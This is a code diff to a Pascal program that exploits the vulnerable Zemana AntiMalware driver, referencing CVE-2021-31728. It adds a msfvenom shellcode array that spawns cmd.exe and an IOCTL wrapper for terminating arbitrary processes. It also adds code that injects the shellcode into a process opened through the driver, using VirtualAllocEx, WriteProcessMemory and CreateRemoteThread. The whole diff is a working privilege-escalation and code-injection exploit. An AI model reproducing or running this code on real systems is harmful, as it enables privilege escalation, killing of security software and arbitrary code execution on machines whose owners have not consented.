@@ -1,5 +1,8 @@
 program memRW;
 
+//check https://github.com/irql0/CVE-2021-31728/blob/master/disk_rw/main.c
+//https://gist.github.com/hfiref0x/e116dcf7e99b8d5d36c333a1f1048916
+
 uses windows,sysutils;
 
 type NTSTATUS = integer;
@@ -49,7 +52,29 @@ var
          written:ptruint;
          dw:dword;
          obi:OBJECT_BASIC_INFORMATION;
-
+         RemoteAllocation:lpvoid=nil;
+         BytesReturned:dword;
+         //*msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c*/
+         buf:array [0..274]of byte=($fc,$48,$83,$e4,$f0,$e8,$c0,$00,$00,$00,$41,$51,$41,$50
+,$52,$51,$56,$48,$31,$d2,$65,$48,$8b,$52,$60,$48,$8b,$52
+,$18,$48,$8b,$52,$20,$48,$8b,$72,$50,$48,$0f,$b7,$4a,$4a
+,$4d,$31,$c9,$48,$31,$c0,$ac,$3c,$61,$7c,$02,$2c,$20,$41
+,$c1,$c9,$0d,$41,$01,$c1,$e2,$ed,$52,$41,$51,$48,$8b,$52
+,$20,$8b,$42,$3c,$48,$01,$d0,$8b,$80,$88,$00,$00,$00,$48
+,$85,$c0,$74,$67,$48,$01,$d0,$50,$8b,$48,$18,$44,$8b,$40
+,$20,$49,$01,$d0,$e3,$56,$48,$ff,$c9,$41,$8b,$34,$88,$48
+,$01,$d6,$4d,$31,$c9,$48,$31,$c0,$ac,$41,$c1,$c9,$0d,$41
+,$01,$c1,$38,$e0,$75,$f1,$4c,$03,$4c,$24,$08,$45,$39,$d1
+,$75,$d8,$58,$44,$8b,$40,$24,$49,$01,$d0,$66,$41,$8b,$0c
+,$48,$44,$8b,$40,$1c,$49,$01,$d0,$41,$8b,$04,$88,$48,$01
+,$d0,$41,$58,$41,$58,$5e,$59,$5a,$41,$58,$41,$59,$41,$5a
+,$48,$83,$ec,$20,$41,$52,$ff,$e0,$58,$41,$59,$5a,$48,$8b
+,$12,$e9,$57,$ff,$ff,$ff,$5d,$48,$ba,$01,$00,$00,$00,$00
+,$00,$00,$00,$48,$8d,$8d,$01,$01,$00,$00,$41,$ba,$31,$8b
+,$6f,$87,$ff,$d5,$bb,$e0,$1d,$2a,$0a,$41,$ba,$a6,$95,$bd
+,$9d,$ff,$d5,$48,$83,$c4,$28,$3c,$06,$7c,$0a,$80,$fb,$e0
+,$75,$05,$bb,$47,$13,$72,$6f,$6a,$00,$59,$41,$89,$da,$ff
+,$d5,$63,$6d,$64,$2e,$65,$78,$65,$00);
 
 
 function LoadDriver(szDriverPath:string;szDriverSvc  :string= '_driver'):boolean;
@@ -149,6 +174,20 @@ begin
 			       nil);
 end;
 
+function ZemanaTerminateProcess(hDevice:thandle;ProcessNumber:DWORD ):boolean;
+var
+	 ReturnedSize:DWORD = 0;
+begin
+	result:= DeviceIoControl(hDevice,
+                               $8000204C,
+                               @ProcessNumber,
+                               sizeof(DWORD),
+                               nil,
+                               0,
+			       @ReturnedSize,
+			       nil);
+end;
+
 function ZemanaOpenThread(hDevice:thandle;ThreadId:DWORD;ThreadHandle:PHANDLE  ):boolean;
 var
 	 ReturnedSize:DWORD = 0;
@@ -209,15 +248,20 @@ if paramstr(1)='open' then
   begin
   //open handle to driver
   svc:=ZemanaOpenHandle('\\.\ZemanaAntiMalware');
+  //svc:=ZemanaOpenHandle('\\.\amsdk');
+
   if svc=thandle(-1) then begin writeln('handle failed');exit;end;
   //register process
   b:=ZemanaRegisterProcess(svc,GetCurrentProcessId );
   writeln('ZemanaRegisterProcess:'+BoolToStr (b));
+  //terminate process
+  //b:=ZemanaTerminateProcess(svc,strtoint(paramstr(2)));
+  //writeln('ZemanaTerminateProcess:'+BoolToStr (b));
   //open process
   b:=ZemanaOpenProcess(svc,strtoint(paramstr(2)),@process);
   //process:=OpenProcess (MAXIMUM_ALLOWED ,false,strtoint(paramstr(2)));
-  writeln('OpenProcess:'+BoolToStr (b));
-  writeln('process:'+inttostr(process));
+  writeln('ZemanaOpenProcess:'+BoolToStr (b));
+  writeln('processhandle:'+inttohex(process,8));
   ptr:=nil;
   //https://www.exploit-db.com/exploits/43987
   //ptr := VirtualAllocEx(Process, nil, $1000, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
@@ -235,7 +279,21 @@ if paramstr(1)='open' then
       then writeln('access_mask:'+inttohex(obi.GrantedAccess,sizeof(access_mask) ))
       else writeln('lasterror:'+inttostr(getlasterror));
   }
-  writeln('TerminateProcess:'+BoolToStr (TerminateProcess (process,0)));
+  //readln;
+  //writeln('TerminateProcess:'+BoolToStr (TerminateProcess (process,0)));
+  //
+  RemoteAllocation := VirtualAllocEx(process, nil, $1000, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  if RemoteAllocation<>nil then
+    begin
+    writeln('VirtualAllocEx ok');
+    if WriteProcessMemory(process, RemoteAllocation, @buf[0], sizeof(buf), @BytesReturned) then
+       begin
+       writeln('WriteProcessMemory ok');
+       if CreateRemoteThread(process, nil, 0, RemoteAllocation, nil, 0, nil)>0 then
+          writeln('CreateRemoteThread ok');
+       end;
+    end;
+  //
   //if process<>thandle(-1) then writeln('GetNextThread:'+BoolToStr(GetNextThread (process )));
   if process<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(process)));
   if dup<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(dup)));
